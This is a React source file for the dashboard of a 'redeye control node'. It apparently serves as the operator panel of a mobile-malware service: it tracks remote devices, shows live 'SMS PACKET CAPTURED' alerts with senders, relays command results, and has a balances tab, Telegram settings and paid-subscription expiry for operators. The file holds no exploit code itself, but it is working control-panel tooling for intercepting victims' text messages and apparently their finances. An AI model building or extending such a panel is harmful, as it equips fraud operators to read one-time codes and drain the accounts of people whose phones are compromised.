import React, { useEffect, useRef, useState } from 'react'
import { Link } from 'react-router-dom'
import { FiLogOut, FiSettings, FiZap, FiShield, FiDollarSign, FiSmartphone, FiClock } from 'react-icons/fi'
import { toast } from 'react-hot-toast'
import DeviceList from './DeviceList'
import BalanceTab from './BalanceTab'
import { API_BASE, WS_BASE } from '../config'

function daysRemaining(iso) {
  if (!iso) return null
  const diff = new Date(iso) - new Date()
  return Math.ceil(diff / (1000 * 60 * 60 * 24))
}

export default function Dashboard({ onLogout, user }) {
  const [devices, setDevices] = useState([])
  const [loading, setLoading] = useState(true)
  const [activeTab, setActiveTab] = useState('devices')
  const wsRef = useRef(null)

  const authHeaders = () => ({ Authorization: `Bearer ${localStorage.getItem('token')}` })

  const fetchDevices = async () => {
    const res = await fetch(`${API_BASE}/devices`, { headers: authHeaders() })
    if (res.status === 401 || res.status === 403) return onLogout()
    const data = await res.json()
    if (data.success) setDevices(data.devices || [])
    setLoading(false)
  }

  useEffect(() => {
    fetchDevices().catch(() => { toast.error('DEVICE MATRIX LOAD FAILED'); setLoading(false) })
    const token = localStorage.getItem('token')
    if (!token || !WS_BASE) return
    const ws = new WebSocket(`${WS_BASE}/admin?token=${token}`)
    wsRef.current = ws
    ws.onopen = () => {}
    ws.onmessage = (e) => {
      let msg
      try { msg = JSON.parse(e.data) } catch { return }
      try {
        if (msg.type === 'initial-devices') setDevices(msg.data || [])
        if (msg.type === 'device-online') { fetchDevices().catch(() => {}) }
        if (msg.type === 'device-offline') { fetchDevices().catch(() => {}) }
        if (msg.type === 'device-update') fetchDevices().catch(() => {})
        if (msg.type === 'sms-received' || msg.type === 'sms:new') {
          toast.success(`SMS PACKET CAPTURED: ${msg.data?.sender || 'unknown'}`)
          window.dispatchEvent(new CustomEvent('sms:new', { detail: msg.data }))
        }
        if (msg.type === 'command-result' && !msg.data?.success) toast.error(`COMMAND FAILED: ${msg.data?.error || 'unknown'}`)
      } catch {}
    }
    ws.onerror = () => toast.error('LIVE SOCKET ERROR')
    return () => ws.close()
  }, [])

  const onDeviceUpdated = (device) => setDevices(prev => prev.map(d => d.device_uid === device.device_uid ? { ...d, ...device } : d))
  const onDeviceDeleted = (uid) => setDevices(prev => prev.filter(d => d.device_uid !== uid))

  const online = devices.filter(d => d.online).length
  const fav = devices.filter(d => d.favorite).length

  return (
    <div className="cyber-bg">
      <MatrixBackdrop />
      <header className="border-b border-emerald-400/20 bg-black/30 backdrop-blur">
        <div className="flex flex-wrap items-center justify-between gap-3 px-4 py-4 md:px-6">
          <div className="flex items-center gap-3">
            <div className="rounded-xl border border-emerald-400/40 bg-emerald-400/10 p-3 text-emerald-300"><FiShield /></div>
            <div>
              <p className="terminal-title">redeye control node</p>
              <h1 className="text-2xl font-black">Admin Operations</h1>
            </div>
          </div>
          <div className="flex w-full flex-col gap-2 md:w-auto md:flex-row md:flex-wrap md:items-center">
            {user?.expires_at && user?.role !== 'owner' && (() => {
              const days = daysRemaining(user.expires_at)
              if (days === null) return null
              const isExpired = days <= 0
              const isWarning = days > 0 && days <= 7
              return (
                <span className={`inline-flex w-full items-center justify-center gap-1.5 rounded-xl border px-3 py-2 text-xs font-bold md:w-auto ${
                  isExpired ? 'border-red-400/40 bg-red-400/15 text-red-300' :
                  isWarning ? 'border-yellow-400/40 bg-yellow-400/15 text-yellow-300' :
                  'border-emerald-400/30 bg-emerald-400/10 text-emerald-300'
                }`}>
                  <FiClock />
                  {isExpired ? 'EXPIRED' : `${days}d LEFT`}
                </span>
              )
            })()}
            {user?.role === 'owner' && <Link to="/owner" className="flex w-full items-center justify-center gap-2 rounded-xl border border-amber-400/30 bg-amber-400/10 px-4 py-2.5 text-sm font-bold text-amber-100 transition hover:bg-amber-400/20 md:w-auto"><FiShield /> Owner Panel</Link>}
            <Link to="/settings" className="flex w-full items-center justify-center gap-2 cyber-btn md:w-auto"><FiSettings /> Settings</Link>
            <button onClick={onLogout} className="flex w-full items-center justify-center gap-2 danger-btn md:w-auto"><FiLogOut /> Logout</button>
          </div>
        </div>
      </header>

      <main className="p-4 md:p-6">
        <div className="mb-6 grid grid-cols-1 gap-4 md:grid-cols-4">
          <Stat label="TOTAL DEVICES" value={devices.length} />
          <Stat label="ONLINE" value={online} />
          <Stat label="OFFLINE" value={devices.length - online} />
          <Stat label="FAVORITES" value={fav} />
        </div>

        <div className="mb-4 flex flex-col gap-2 md:flex-row">
          <button
            onClick={() => setActiveTab('devices')}
            className={`w-full justify-center rounded-xl border px-4 py-2.5 text-xs font-bold transition md:w-auto md:py-2 ${activeTab === 'devices' ? 'border-emerald-300/60 bg-emerald-400/25 text-emerald-50' : 'border-emerald-500/30 text-emerald-300/60 hover:bg-emerald-500/10'}`}
          >
            <FiSmartphone className="mr-1 inline" /> DEVICES
          </button>
          <button
            onClick={() => setActiveTab('balances')}
            className={`w-full justify-center rounded-xl border px-4 py-2.5 text-xs font-bold transition md:w-auto md:py-2 ${activeTab === 'balances' ? 'border-emerald-300/60 bg-emerald-400/25 text-emerald-50' : 'border-emerald-500/30 text-emerald-300/60 hover:bg-emerald-500/10'}`}
          >
            <FiDollarSign className="mr-1 inline" /> BALANCES
          </button>
        </div>

        {activeTab === 'devices' ? (
          <>
            <div className="mb-4 flex items-center gap-2 text-sm muted"><FiZap /> Realtime device matrix. Use Settings for API keys, Telegram, and wake-all logs.</div>
            <DeviceList devices={devices} loading={loading} onUpdated={onDeviceUpdated} onDeleted={onDeviceDeleted} />
          </>
        ) : (
          <BalanceTab />
        )}
      </main>
    </div>
  )
}

function Stat({ label, value }) {
  return <div className="cyber-card p-5"><p className="terminal-title">{label}</p><p className="mt-2 font-mono text-4xl font-black text-emerald-300">{value}</p></div>
}

function MatrixBackdrop() {
  return <div className="matrix-backdrop" aria-hidden="true">{Array.from({ length: 18 }).map((_, i) => <span key={i} style={{ left: `${i * 6}%`, animationDelay: `${(i % 7) * -0.8}s`, animationDuration: `${7 + (i % 5)}s` }}>0101\nFS\nROOT\nPING\nSAFE\nTRACE</span>)}</div>
}
